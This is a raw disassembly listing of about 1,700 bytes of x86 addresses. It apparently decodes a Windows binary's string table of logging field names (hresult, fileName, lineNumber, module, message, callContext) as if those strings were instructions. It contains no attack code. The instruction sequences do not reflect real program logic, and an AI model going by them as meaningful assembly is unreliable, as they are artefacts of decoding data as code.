  401745:	fs dec ecx
  401747:	add    BYTE PTR fs:[eax],cl
  40174a:	addr16 jb 0x4017bc
  40174d:	jne    0x4017bf
  40174f:	add    BYTE PTR [eax],cl
  401751:	ins    BYTE PTR es:[edi],dx
  401752:	outs   dx,DWORD PTR ds:[esi]
  401753:	arpl   WORD PTR [ecx+0x74],sp
  401756:	imul   ebp,DWORD PTR [edi+0x6e],0x73690800
  40175d:	inc    ecx
  40175e:	fs ins DWORD PTR es:[edi],dx
  401760:	imul   ebp,DWORD PTR [esi+0x0],0x50b030d
  401767:	add    al,BYTE PTR [eax]
  401769:	add    BYTE PTR [eax],al
  40176b:	add    BYTE PTR [eax],al
  40176d:	and    BYTE PTR [eax],al
  40176f:	add    BYTE PTR [edi],dh
  401771:	add    BYTE PTR [eax],al
  401773:	inc    edx
  401774:	jne    0x4017df
  401776:	ins    BYTE PTR es:[edi],dx
  401777:	fs inc esp
  401779:	gs popaw 
  40177c:	jne    0x4017ea
  40177e:	je     0x4017c7
  401780:	jb     0x4017f1
  401782:	jne    0x4017f4
  401784:	jae    0x401786
  401786:	ja     0x4017f1
  401788:	ins    BYTE PTR es:[edi],dx
  401789:	inc    ecx
  40178a:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  40178e:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680298
  401796:	gs jae 0x40180e
  401799:	ins    BYTE PTR es:[edi],dx
  40179a:	je     0x40179c
  40179c:	or     BYTE PTR [eax+ebp*2+0x72],dh
  4017a0:	gs popa 
  4017a2:	fs dec ecx
  4017a4:	add    BYTE PTR fs:[eax],cl
  4017a7:	add    ecx,DWORD PTR [ebx]
  4017a9:	add    eax,0x1
  4017ae:	add    BYTE PTR [eax],al
  4017b0:	and    BYTE PTR [eax],al
  4017b2:	add    BYTE PTR [ecx+0x0],al
  4017b5:	add    BYTE PTR [edx+0x75],al
  4017b8:	imul   ebp,DWORD PTR [esp+eiz*2+0x44],0x75616665
  4017c0:	ins    BYTE PTR es:[edi],dx
  4017c1:	je     0x40180a
  4017c3:	jb     0x401834
  4017c5:	jne    0x401837
  4017c7:	jae    0x4017c9
  4017c9:	ja     0x401834
  4017cb:	ins    BYTE PTR es:[edi],dx
  4017cc:	inc    ecx
  4017cd:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4017d1:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x68740198
  4017d9:	jb     0x401840
  4017db:	popa   
  4017dc:	fs dec ecx
  4017de:	add    BYTE PTR fs:[eax],cl
  4017e1:	ins    BYTE PTR es:[edi],dx
  4017e2:	outs   dx,DWORD PTR ds:[esi]
  4017e3:	arpl   WORD PTR [ecx+0x74],sp
  4017e6:	imul   ebp,DWORD PTR [edi+0x6e],0x73690800
  4017ed:	inc    ecx
  4017ee:	fs ins DWORD PTR es:[edi],dx
  4017f0:	imul   ebp,DWORD PTR [esi+0x0],0x50b030d
  4017f7:	add    DWORD PTR [eax],eax
  4017f9:	add    BYTE PTR [eax],al
  4017fb:	add    BYTE PTR [eax],al
  4017fd:	and    BYTE PTR [eax],al
  4017ff:	add    BYTE PTR [esi],bh
  401801:	add    BYTE PTR [eax],al
  401803:	dec    ecx
  401804:	outs   dx,BYTE PTR ds:[esi]
  401805:	jbe    0x401868
  401807:	ins    BYTE PTR es:[edi],dx
  401808:	imul   esp,DWORD PTR [ecx+eax*2+0x72],0x656d7567
  401810:	outs   dx,BYTE PTR ds:[esi]
  401811:	je     0x401886
  401813:	add    BYTE PTR [edi+0x69],dh
  401816:	ins    BYTE PTR es:[edi],dx
  401817:	inc    ecx
  401818:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  40181c:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x68740198
  401824:	jb     0x40188b
  401826:	popa   
  401827:	fs dec ecx
  401829:	add    BYTE PTR fs:[eax],cl
  40182c:	outs   dx,DWORD PTR ds:[esi]
  40182d:	jo     0x4018a3
  40182f:	imul   ebp,DWORD PTR [edi+0x6e],0x69028600
  401836:	jae    0x401879
  401838:	fs ins DWORD PTR es:[edi],dx
  40183a:	imul   ebp,DWORD PTR [esi+0x0],0x50b030d
  401841:	add    BYTE PTR [eax],al
  401843:	add    BYTE PTR [eax],al
  401845:	add    BYTE PTR [eax],al
  401847:	and    BYTE PTR [eax],al
  401849:	add    BYTE PTR [edi],dl
  40184b:	add    BYTE PTR [eax],al
  40184d:	inc    ebx
  40184e:	jb     0x4018b5
  401850:	popa   
  401851:	je     0x4018b8
  401853:	dec    esp
  401854:	imul   ebp,DWORD PTR [esi+0x6b],0x65786500
  40185b:	dec    esi
  40185c:	popa   
  40185d:	ins    DWORD PTR es:[edi],dx
  40185e:	add    BYTE PTR gs:[ecx],al
  401861:	add    ecx,DWORD PTR [ebx]
  401863:	add    eax,0x0
  401868:	add    BYTE PTR [eax],al
  40186a:	and    BYTE PTR [eax],al
  40186c:	add    BYTE PTR [esi],dl
  40186e:	add    BYTE PTR [eax],al
  401870:	dec    esi
  401871:	outs   dx,DWORD PTR ds:[esi]
  401872:	je     0x4018c4
  401874:	jb     0x4018db
  401876:	inc    ebx
  401877:	outs   dx,DWORD PTR ds:[esi]
  401878:	outs   dx,BYTE PTR ds:[esi]
  401879:	jbe    0x4018cd
  40187b:	outs   dx,BYTE PTR gs:[esi]
  40187d:	popa   
  40187e:	ins    DWORD PTR es:[edi],dx
  40187f:	imul   ebp,DWORD PTR [esi+0x67],0x50b0300
  401886:	add    al,BYTE PTR [eax]
  401888:	add    BYTE PTR [eax],al
  40188a:	add    BYTE PTR [eax],al
  40188c:	and    BYTE PTR [eax],al
  40188e:	add    ah,bh
  401890:	add    BYTE PTR [eax],al
  401892:	dec    ecx
  401893:	outs   dx,BYTE PTR ds:[esi]
  401894:	jbe    0x4018f7
  401896:	ins    BYTE PTR es:[edi],dx
  401897:	imul   esp,DWORD PTR [ecx+eax*2+0x72],0x656d7567
  40189f:	outs   dx,BYTE PTR ds:[esi]
  4018a0:	je     0x401915
  4018a2:	add    BYTE PTR [edi+0x69],dh
  4018a5:	ins    BYTE PTR es:[edi],dx
  4018a6:	inc    ecx
  4018a7:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4018ab:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680e98
  4018b3:	gs jae 0x40192b
  4018b6:	ins    BYTE PTR es:[edi],dx
  4018b7:	je     0x4018b9
  4018b9:	or     BYTE PTR [esi+0x69],ah
  4018bc:	ins    BYTE PTR es:[edi],dx
  4018bd:	gs dec esi
  4018bf:	popa   
  4018c0:	ins    DWORD PTR es:[edi],dx
  4018c1:	add    BYTE PTR gs:[edx],al
  4018c4:	ins    BYTE PTR es:[edi],dx
  4018c5:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  4018cc:	gs jb  0x4018cf
  4018cf:	or     BYTE PTR [ebp+0x6f],ch
  4018d2:	fs jne 0x401941
  4018d5:	add    BYTE PTR gs:[edx],al
  4018d8:	popaw  
  4018da:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  4018e2:	add    BYTE PTR gs:[eax],cl
  4018e5:	ins    DWORD PTR es:[edi],dx
  4018e6:	gs jae 0x40195c
  4018e9:	popa   
  4018ea:	add    BYTE PTR gs:[bx+di],al
  4018ee:	je     0x401958
  4018f0:	jb     0x401957
  4018f2:	popa   
  4018f3:	fs dec ecx
  4018f5:	add    BYTE PTR fs:[eax],cl
  4018f8:	arpl   WORD PTR [ecx+0x6c],sp
  4018fb:	ins    BYTE PTR es:[edi],dx
  4018fc:	inc    ebx
  4018fd:	outs   dx,DWORD PTR ds:[esi]
  4018fe:	outs   dx,BYTE PTR ds:[esi]
  4018ff:	je     0x401966
  401901:	js     0x401977
  401903:	add    BYTE PTR [edx],al
  401905:	outs   dx,DWORD PTR ds:[esi]
  401906:	jb     0x401971
  401908:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401910:	inc    ebx
  401911:	outs   dx,DWORD PTR ds:[esi]
  401912:	outs   dx,BYTE PTR ds:[esi]
  401913:	je     0x40197a
  401915:	js     0x40198b
  401917:	dec    ecx
  401918:	add    BYTE PTR fs:[eax],cl
  40191b:	outs   dx,DWORD PTR ds:[esi]
  40191c:	jb     0x401987
  40191e:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401926:	inc    ebx
  401927:	outs   dx,DWORD PTR ds:[esi]
  401928:	outs   dx,BYTE PTR ds:[esi]
  401929:	je     0x401990
  40192b:	js     0x4019a1
  40192d:	dec    esi
  40192e:	popa   
  40192f:	ins    DWORD PTR es:[edi],dx
  401930:	add    BYTE PTR gs:[edx],al
  401933:	outs   dx,DWORD PTR ds:[esi]
  401934:	jb     0x40199f
  401936:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  40193e:	inc    ebx
  40193f:	outs   dx,DWORD PTR ds:[esi]
  401940:	outs   dx,BYTE PTR ds:[esi]
  401941:	je     0x4019a8
  401943:	js     0x4019b9
  401945:	dec    ebp
  401946:	gs jae 0x4019bc
  401949:	popa   
  40194a:	add    BYTE PTR gs:[bx+di],al
  40194e:	arpl   WORD PTR [ebp+0x72],si
  401951:	jb     0x4019b8
  401953:	outs   dx,BYTE PTR ds:[esi]
  401954:	je     0x401999
  401956:	outs   dx,DWORD PTR ds:[esi]
  401957:	outs   dx,BYTE PTR ds:[esi]
  401958:	je     0x4019bf
  40195a:	js     0x4019d0
  40195c:	dec    ecx
  40195d:	add    BYTE PTR fs:[eax],cl
  401960:	arpl   WORD PTR [ebp+0x72],si
  401963:	jb     0x4019ca
  401965:	outs   dx,BYTE PTR ds:[esi]
  401966:	je     0x4019ab
  401968:	outs   dx,DWORD PTR ds:[esi]
  401969:	outs   dx,BYTE PTR ds:[esi]
  40196a:	je     0x4019d1
  40196c:	js     0x4019e2
  40196e:	dec    esi
  40196f:	popa   
  401970:	ins    DWORD PTR es:[edi],dx
  401971:	add    BYTE PTR gs:[edx],al
  401974:	arpl   WORD PTR [ebp+0x72],si
  401977:	jb     0x4019de
  401979:	outs   dx,BYTE PTR ds:[esi]
  40197a:	je     0x4019bf
  40197c:	outs   dx,DWORD PTR ds:[esi]
  40197d:	outs   dx,BYTE PTR ds:[esi]
  40197e:	je     0x4019e5
  401980:	js     0x4019f6
  401982:	dec    ebp
  401983:	gs jae 0x4019f9
  401986:	popa   
  401987:	add    BYTE PTR gs:[bx+di],al
  40198b:	add    ecx,DWORD PTR [ebx]
  40198d:	add    eax,0x1
  401992:	add    BYTE PTR [eax],al
  401994:	and    BYTE PTR [eax],al
  401996:	add    BYTE PTR [edx+0x0],cl
  401999:	add    BYTE PTR [edx+0x75],al
  40199c:	imul   ebp,DWORD PTR [esp+eiz*2+0x53],0x69746365
  4019a4:	outs   dx,DWORD PTR ds:[esi]
  4019a5:	outs   dx,BYTE PTR ds:[esi]
  4019a6:	inc    edi
  4019a7:	jb     0x401a18
  4019a9:	jne    0x401a1b
  4019ab:	jae    0x4019ad
  4019ad:	ja     0x401a18
  4019af:	ins    BYTE PTR es:[edi],dx
  4019b0:	inc    ecx
  4019b1:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4019b5:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x68740198
  4019bd:	jb     0x401a24
  4019bf:	popa   
  4019c0:	fs dec ecx
  4019c2:	add    BYTE PTR fs:[eax],cl
  4019c5:	jae    0x401a2c
  4019c7:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4019cb:	outs   dx,BYTE PTR ds:[esi]
  4019cc:	add    BYTE PTR [ecx],al
  4019ce:	ins    BYTE PTR es:[edi],dx
  4019cf:	outs   dx,DWORD PTR ds:[esi]
  4019d0:	arpl   WORD PTR [ecx+0x74],sp
  4019d3:	imul   ebp,DWORD PTR [edi+0x6e],0x73690800
  4019da:	inc    ecx
  4019db:	fs ins DWORD PTR es:[edi],dx
  4019dd:	imul   ebp,DWORD PTR [esi+0x0],0x50b030d
  4019e4:	add    al,BYTE PTR [eax]
  4019e6:	add    BYTE PTR [eax],al
  4019e8:	add    BYTE PTR [eax],al
  4019ea:	and    BYTE PTR [eax],al
  4019ec:	add    dh,bh
  4019ee:	add    BYTE PTR [eax],al
  4019f0:	inc    edx
  4019f1:	jne    0x401a5c
  4019f3:	ins    BYTE PTR es:[edi],dx
  4019f4:	fs push ebx
  4019f6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4019fb:	outs   dx,BYTE PTR ds:[esi]
  4019fc:	inc    edi
  4019fd:	jb     0x401a6e
  4019ff:	jne    0x401a71
  401a01:	jae    0x401a03
  401a03:	ja     0x401a6e
  401a05:	ins    BYTE PTR es:[edi],dx
  401a06:	inc    ecx
  401a07:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401a0b:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680e98
  401a13:	gs jae 0x401a8b
  401a16:	ins    BYTE PTR es:[edi],dx
  401a17:	je     0x401a19
  401a19:	or     BYTE PTR [esi+0x69],ah
  401a1c:	ins    BYTE PTR es:[edi],dx
  401a1d:	gs dec esi
  401a1f:	popa   
  401a20:	ins    DWORD PTR es:[edi],dx
  401a21:	add    BYTE PTR gs:[edx],al
  401a24:	ins    BYTE PTR es:[edi],dx
  401a25:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  401a2c:	gs jb  0x401a2f
  401a2f:	or     BYTE PTR [ebp+0x6f],ch
  401a32:	fs jne 0x401aa1
  401a35:	add    BYTE PTR gs:[edx],al
  401a38:	popaw  
  401a3a:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  401a42:	add    BYTE PTR gs:[eax],cl
  401a45:	ins    DWORD PTR es:[edi],dx
  401a46:	gs jae 0x401abc
  401a49:	popa   
  401a4a:	add    BYTE PTR gs:[bx+di],al
  401a4e:	je     0x401ab8
  401a50:	jb     0x401ab7
  401a52:	popa   
  401a53:	fs dec ecx
  401a55:	add    BYTE PTR fs:[eax],cl
  401a58:	arpl   WORD PTR [ecx+0x6c],sp
  401a5b:	ins    BYTE PTR es:[edi],dx
  401a5c:	inc    ebx
  401a5d:	outs   dx,DWORD PTR ds:[esi]
  401a5e:	outs   dx,BYTE PTR ds:[esi]
  401a5f:	je     0x401ac6
  401a61:	js     0x401ad7
  401a63:	add    BYTE PTR [edx],al
  401a65:	outs   dx,DWORD PTR ds:[esi]
  401a66:	jb     0x401ad1
  401a68:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401a70:	inc    ebx
  401a71:	outs   dx,DWORD PTR ds:[esi]
  401a72:	outs   dx,BYTE PTR ds:[esi]
  401a73:	je     0x401ada
  401a75:	js     0x401aeb
  401a77:	dec    ecx
  401a78:	add    BYTE PTR fs:[eax],cl
  401a7b:	outs   dx,DWORD PTR ds:[esi]
  401a7c:	jb     0x401ae7
  401a7e:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401a86:	inc    ebx
  401a87:	outs   dx,DWORD PTR ds:[esi]
  401a88:	outs   dx,BYTE PTR ds:[esi]
  401a89:	je     0x401af0
  401a8b:	js     0x401b01
  401a8d:	dec    esi
  401a8e:	popa   
  401a8f:	ins    DWORD PTR es:[edi],dx
  401a90:	add    BYTE PTR gs:[edx],al
  401a93:	outs   dx,DWORD PTR ds:[esi]
  401a94:	jb     0x401aff
  401a96:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401a9e:	inc    ebx
  401a9f:	outs   dx,DWORD PTR ds:[esi]
  401aa0:	outs   dx,BYTE PTR ds:[esi]
  401aa1:	je     0x401b08
  401aa3:	js     0x401b19
  401aa5:	dec    ebp
  401aa6:	gs jae 0x401b1c
  401aa9:	popa   
  401aaa:	add    BYTE PTR gs:[bx+di],al
  401aae:	arpl   WORD PTR [ebp+0x72],si
  401ab1:	jb     0x401b18
  401ab3:	outs   dx,BYTE PTR ds:[esi]
  401ab4:	je     0x401af9
  401ab6:	outs   dx,DWORD PTR ds:[esi]
  401ab7:	outs   dx,BYTE PTR ds:[esi]
  401ab8:	je     0x401b1f
  401aba:	js     0x401b30
  401abc:	dec    ecx
  401abd:	add    BYTE PTR fs:[eax],cl
  401ac0:	arpl   WORD PTR [ebp+0x72],si
  401ac3:	jb     0x401b2a
  401ac5:	outs   dx,BYTE PTR ds:[esi]
  401ac6:	je     0x401b0b
  401ac8:	outs   dx,DWORD PTR ds:[esi]
  401ac9:	outs   dx,BYTE PTR ds:[esi]
  401aca:	je     0x401b31
  401acc:	js     0x401b42
  401ace:	dec    esi
  401acf:	popa   
  401ad0:	ins    DWORD PTR es:[edi],dx
  401ad1:	add    BYTE PTR gs:[edx],al
  401ad4:	arpl   WORD PTR [ebp+0x72],si
  401ad7:	jb     0x401b3e
  401ad9:	outs   dx,BYTE PTR ds:[esi]
  401ada:	je     0x401b1f
  401adc:	outs   dx,DWORD PTR ds:[esi]
  401add:	outs   dx,BYTE PTR ds:[esi]
  401ade:	je     0x401b45
  401ae0:	js     0x401b56
  401ae2:	dec    ebp
  401ae3:	gs jae 0x401b59
  401ae6:	popa   
  401ae7:	add    BYTE PTR gs:[bx+di],al
  401aeb:	add    ecx,DWORD PTR [ebx]
  401aed:	add    eax,0x0
  401af2:	add    BYTE PTR [eax],al
  401af4:	and    BYTE PTR [eax],al
  401af6:	add    bh,dh
  401af8:	add    BYTE PTR [eax],al
  401afa:	inc    esi
  401afb:	popa   
  401afc:	ins    BYTE PTR es:[edi],dx
  401afd:	ins    BYTE PTR es:[edi],dx
  401afe:	bound  esp,QWORD PTR [ecx+0x63]
  401b01:	imul   eax,DWORD PTR [ebp+0x72],0x72
  401b05:	outs   dx,DWORD PTR ds:[esi]
  401b06:	jb     0x401b08
  401b08:	ja     0x401b73
  401b0a:	ins    BYTE PTR es:[edi],dx
  401b0b:	push   edx
  401b0c:	gs jae 0x401b84
  401b0f:	ins    BYTE PTR es:[edi],dx
  401b10:	je     0x401b12
  401b12:	cwde   
  401b13:	push   cs
  401b14:	push   0x75736572
  401b19:	ins    BYTE PTR es:[edi],dx
  401b1a:	je     0x401b1c
  401b1c:	or     BYTE PTR [esi+0x69],ah
  401b1f:	ins    BYTE PTR es:[edi],dx
  401b20:	gs dec esi
  401b22:	popa   
  401b23:	ins    DWORD PTR es:[edi],dx
  401b24:	add    BYTE PTR gs:[edx],al
  401b27:	ins    BYTE PTR es:[edi],dx
  401b28:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  401b2f:	gs jb  0x401b32
  401b32:	or     BYTE PTR [ebp+0x6f],ch
  401b35:	fs jne 0x401ba4
  401b38:	add    BYTE PTR gs:[edx],al
  401b3b:	popaw  
  401b3d:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  401b45:	add    BYTE PTR gs:[eax],cl
  401b48:	ins    DWORD PTR es:[edi],dx
  401b49:	gs jae 0x401bbf
  401b4c:	popa   
  401b4d:	add    BYTE PTR gs:[bx+di],al
  401b51:	je     0x401bbb
  401b53:	jb     0x401bba
  401b55:	popa   
  401b56:	fs dec ecx
  401b58:	add    BYTE PTR fs:[eax],cl
  401b5b:	arpl   WORD PTR [ecx+0x6c],sp
  401b5e:	ins    BYTE PTR es:[edi],dx
  401b5f:	inc    ebx
  401b60:	outs   dx,DWORD PTR ds:[esi]
  401b61:	outs   dx,BYTE PTR ds:[esi]
  401b62:	je     0x401bc9
  401b64:	js     0x401bda
  401b66:	add    BYTE PTR [edx],al
  401b68:	outs   dx,DWORD PTR ds:[esi]
  401b69:	jb     0x401bd4
  401b6b:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401b73:	inc    ebx
  401b74:	outs   dx,DWORD PTR ds:[esi]
  401b75:	outs   dx,BYTE PTR ds:[esi]
  401b76:	je     0x401bdd
  401b78:	js     0x401bee
  401b7a:	dec    ecx
  401b7b:	add    BYTE PTR fs:[eax],cl
  401b7e:	outs   dx,DWORD PTR ds:[esi]
  401b7f:	jb     0x401bea
  401b81:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401b89:	inc    ebx
  401b8a:	outs   dx,DWORD PTR ds:[esi]
  401b8b:	outs   dx,BYTE PTR ds:[esi]
  401b8c:	je     0x401bf3
  401b8e:	js     0x401c04
  401b90:	dec    esi
  401b91:	popa   
  401b92:	ins    DWORD PTR es:[edi],dx
  401b93:	add    BYTE PTR gs:[edx],al
  401b96:	outs   dx,DWORD PTR ds:[esi]
  401b97:	jb     0x401c02
  401b99:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401ba1:	inc    ebx
  401ba2:	outs   dx,DWORD PTR ds:[esi]
  401ba3:	outs   dx,BYTE PTR ds:[esi]
  401ba4:	je     0x401c0b
  401ba6:	js     0x401c1c
  401ba8:	dec    ebp
  401ba9:	gs jae 0x401c1f
  401bac:	popa   
  401bad:	add    BYTE PTR gs:[bx+di],al
  401bb1:	arpl   WORD PTR [ebp+0x72],si
  401bb4:	jb     0x401c1b
  401bb6:	outs   dx,BYTE PTR ds:[esi]
  401bb7:	je     0x401bfc
  401bb9:	outs   dx,DWORD PTR ds:[esi]
  401bba:	outs   dx,BYTE PTR ds:[esi]
  401bbb:	je     0x401c22
  401bbd:	js     0x401c33
  401bbf:	dec    ecx
  401bc0:	add    BYTE PTR fs:[eax],cl
  401bc3:	arpl   WORD PTR [ebp+0x72],si
  401bc6:	jb     0x401c2d
  401bc8:	outs   dx,BYTE PTR ds:[esi]
  401bc9:	je     0x401c0e
  401bcb:	outs   dx,DWORD PTR ds:[esi]
  401bcc:	outs   dx,BYTE PTR ds:[esi]
  401bcd:	je     0x401c34
  401bcf:	js     0x401c45
  401bd1:	dec    esi
  401bd2:	popa   
  401bd3:	ins    DWORD PTR es:[edi],dx
  401bd4:	add    BYTE PTR gs:[edx],al
  401bd7:	arpl   WORD PTR [ebp+0x72],si
  401bda:	jb     0x401c41
  401bdc:	outs   dx,BYTE PTR ds:[esi]
  401bdd:	je     0x401c22
  401bdf:	outs   dx,DWORD PTR ds:[esi]
  401be0:	outs   dx,BYTE PTR ds:[esi]
  401be1:	je     0x401c48
  401be3:	js     0x401c59
  401be5:	dec    ebp
  401be6:	gs jae 0x401c5c
  401be9:	popa   
  401bea:	add    BYTE PTR gs:[bx+di],al
  401bee:	add    ecx,DWORD PTR [ebx]
  401bf0:	add    eax,0x2
  401bf5:	add    BYTE PTR [eax],al
  401bf7:	and    BYTE PTR [eax],al
  401bf9:	add    dh,dh
  401bfb:	add    BYTE PTR [eax],al
  401bfd:	inc    edx
  401bfe:	jne    0x401c69
  401c00:	ins    BYTE PTR es:[edi],dx
  401c01:	fs inc edi
  401c03:	jb     0x401c74
  401c05:	jne    0x401c77
  401c07:	add    BYTE PTR [edi+0x69],dh
  401c0a:	ins    BYTE PTR es:[edi],dx
  401c0b:	inc    ecx
  401c0c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401c10:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680e98
  401c18:	gs jae 0x401c90
  401c1b:	ins    BYTE PTR es:[edi],dx
  401c1c:	je     0x401c1e
  401c1e:	or     BYTE PTR [esi+0x69],ah
  401c21:	ins    BYTE PTR es:[edi],dx
  401c22:	gs dec esi
  401c24:	popa   
  401c25:	ins    DWORD PTR es:[edi],dx
  401c26:	add    BYTE PTR gs:[edx],al
  401c29:	ins    BYTE PTR es:[edi],dx
  401c2a:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  401c31:	gs jb  0x401c34
  401c34:	or     BYTE PTR [ebp+0x6f],ch
  401c37:	fs jne 0x401ca6
  401c3a:	add    BYTE PTR gs:[edx],al
  401c3d:	popaw  
  401c3f:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  401c47:	add    BYTE PTR gs:[eax],cl
  401c4a:	ins    DWORD PTR es:[edi],dx
  401c4b:	gs jae 0x401cc1
  401c4e:	popa   
  401c4f:	add    BYTE PTR gs:[bx+di],al
  401c53:	je     0x401cbd
  401c55:	jb     0x401cbc
  401c57:	popa   
  401c58:	fs dec ecx
  401c5a:	add    BYTE PTR fs:[eax],cl
  401c5d:	arpl   WORD PTR [ecx+0x6c],sp
  401c60:	ins    BYTE PTR es:[edi],dx
  401c61:	inc    ebx
  401c62:	outs   dx,DWORD PTR ds:[esi]
  401c63:	outs   dx,BYTE PTR ds:[esi]
  401c64:	je     0x401ccb
  401c66:	js     0x401cdc
  401c68:	add    BYTE PTR [edx],al
  401c6a:	outs   dx,DWORD PTR ds:[esi]
  401c6b:	jb     0x401cd6
  401c6d:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401c75:	inc    ebx
  401c76:	outs   dx,DWORD PTR ds:[esi]
  401c77:	outs   dx,BYTE PTR ds:[esi]
  401c78:	je     0x401cdf
  401c7a:	js     0x401cf0
  401c7c:	dec    ecx
  401c7d:	add    BYTE PTR fs:[eax],cl
  401c80:	outs   dx,DWORD PTR ds:[esi]
  401c81:	jb     0x401cec
  401c83:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401c8b:	inc    ebx
  401c8c:	outs   dx,DWORD PTR ds:[esi]
  401c8d:	outs   dx,BYTE PTR ds:[esi]
  401c8e:	je     0x401cf5
  401c90:	js     0x401d06
  401c92:	dec    esi
  401c93:	popa   
  401c94:	ins    DWORD PTR es:[edi],dx
  401c95:	add    BYTE PTR gs:[edx],al
  401c98:	outs   dx,DWORD PTR ds:[esi]
  401c99:	jb     0x401d04
  401c9b:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  401ca3:	inc    ebx
  401ca4:	outs   dx,DWORD PTR ds:[esi]
  401ca5:	outs   dx,BYTE PTR ds:[esi]
  401ca6:	je     0x401d0d
  401ca8:	js     0x401d1e
  401caa:	dec    ebp
  401cab:	gs jae 0x401d21
  401cae:	popa   
  401caf:	add    BYTE PTR gs:[bx+di],al
  401cb3:	arpl   WORD PTR [ebp+0x72],si
  401cb6:	jb     0x401d1d
  401cb8:	outs   dx,BYTE PTR ds:[esi]
  401cb9:	je     0x401cfe
  401cbb:	outs   dx,DWORD PTR ds:[esi]
  401cbc:	outs   dx,BYTE PTR ds:[esi]
  401cbd:	je     0x401d24
  401cbf:	js     0x401d35
  401cc1:	dec    ecx
  401cc2:	add    BYTE PTR fs:[eax],cl
  401cc5:	arpl   WORD PTR [ebp+0x72],si
  401cc8:	jb     0x401d2f
  401cca:	outs   dx,BYTE PTR ds:[esi]
  401ccb:	je     0x401d10
  401ccd:	outs   dx,DWORD PTR ds:[esi]
  401cce:	outs   dx,BYTE PTR ds:[esi]
  401ccf:	je     0x401d36
  401cd1:	js     0x401d47
  401cd3:	dec    esi
  401cd4:	popa   
  401cd5:	ins    DWORD PTR es:[edi],dx
  401cd6:	add    BYTE PTR gs:[edx],al
  401cd9:	arpl   WORD PTR [ebp+0x72],si
  401cdc:	jb     0x401d43
  401cde:	outs   dx,BYTE PTR ds:[esi]
  401cdf:	je     0x401d24
  401ce1:	outs   dx,DWORD PTR ds:[esi]
  401ce2:	outs   dx,BYTE PTR ds:[esi]
  401ce3:	je     0x401d4a
  401ce5:	js     0x401d5b
  401ce7:	dec    ebp
  401ce8:	gs jae 0x401d5e
  401ceb:	popa   
  401cec:	add    BYTE PTR gs:[bx+di],al
  401cf0:	add    ecx,DWORD PTR [ebx]
  401cf2:	add    eax,0x0
  401cf7:	add    BYTE PTR [eax],al
  401cf9:	and    BYTE PTR [eax],al
  401cfb:	add    BYTE PTR [esi],cl
  401cfd:	add    BYTE PTR [eax],al
  401cff:	inc    esp
  401d00:	gs ins BYTE PTR es:[edi],dx
  401d02:	gs je  0x401d6a
  401d05:	dec    esp
  401d06:	imul   ebp,DWORD PTR [esi+0x6b],0x50b0300
  401d0d:	add    al,BYTE PTR [eax]
  401d0f:	add    BYTE PTR [eax],al
  401d11:	add    BYTE PTR [eax],al
  401d13:	and    BYTE PTR [eax],al
  401d15:	add    BYTE PTR [edi],ch
  401d17:	add    BYTE PTR [eax],al
  401d19:	inc    edx
  401d1a:	jne    0x401d85
  401d1c:	ins    BYTE PTR es:[edi],dx
  401d1d:	fs inc edi
  401d1f:	jb     0x401d90
  401d21:	jne    0x401d93
  401d23:	add    BYTE PTR [edi+0x69],dh
  401d26:	ins    BYTE PTR es:[edi],dx
  401d27:	inc    ecx
  401d28:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401d2c:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680298
  401d34:	gs jae 0x401dac
  401d37:	ins    BYTE PTR es:[edi],dx
  401d38:	je     0x401d3a
  401d3a:	or     BYTE PTR [eax+ebp*2+0x72],dh
  401d3e:	gs popa 
  401d40:	fs dec ecx
  401d42:	add    BYTE PTR fs:[eax],cl
  401d45:	add    ecx,DWORD PTR [ebx]
  401d47:	add    eax,0x2
  401d4c:	add    BYTE PTR [eax],al
  401d4e:	and    BYTE PTR [eax],al
  401d50:	add    BYTE PTR ds:0x6e490000,dh
  401d56:	jbe    0x401db9
  401d58:	ins    BYTE PTR es:[edi],dx
  401d59:	imul   esp,DWORD PTR [ecx+eax*2+0x72],0x656d7567
  401d61:	outs   dx,BYTE PTR ds:[esi]
  401d62:	je     0x401dd7
  401d64:	add    BYTE PTR [edi+0x69],dh
  401d67:	ins    BYTE PTR es:[edi],dx
  401d68:	inc    ecx
  401d69:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401d6d:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x72680298
  401d75:	gs jae 0x401ded
  401d78:	ins    BYTE PTR es:[edi],dx
  401d79:	je     0x401d7b
  401d7b:	or     BYTE PTR [eax+ebp*2+0x72],dh
  401d7f:	gs popa 
  401d81:	fs dec ecx
  401d83:	add    BYTE PTR fs:[eax],cl
